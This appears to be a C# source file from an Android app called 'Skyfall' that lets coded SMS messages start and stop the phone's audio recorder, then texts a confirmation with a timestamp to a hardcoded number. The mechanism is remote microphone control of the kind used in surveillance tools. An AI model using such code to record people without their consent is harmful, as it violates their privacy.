using Android.Telephony;

namespace Skyfall
{
    static class ShellDriver
    {
        private static string lastCommand = null;

        static public bool ParseIncomingSMS(string messageBody)
        {
            messageBody.ToUpper();

            if (messageBody.Equals("SHELL:123"))
            {
                Kernel.LogMessage("<span style=\"color:blueviolet\">📡 REMOTE COMMAND [" + messageBody + "] ISSUED</span>");

                AudioRecorder.Start(AudioRecorder.RecorderIntent.Manual);

                lastCommand = "SHELL:123 @ ";
                RespondRemoteCommand();
                return true;
            }

            if (messageBody.Equals("SHELL:321"))
            {
                Kernel.LogMessage("<span style=\"color:blueviolet\">📡 REMOTE COMMAND [" + messageBody + "] ISSUED</span>");
                
                AudioRecorder.Stop(AudioRecorder.RecorderIntent.Manual);
             
                lastCommand = "SHELL:321 @ ";
                RespondRemoteCommand();
                return true;
            }

            return false;
        }

        static public void RespondRemoteCommand()
        {
            Kernel.Beep();
            SmsManager.Default.SendTextMessage("22988245990", null, lastCommand + Kernel.GetFormattedDateTime(), null, null);
        }
    }
}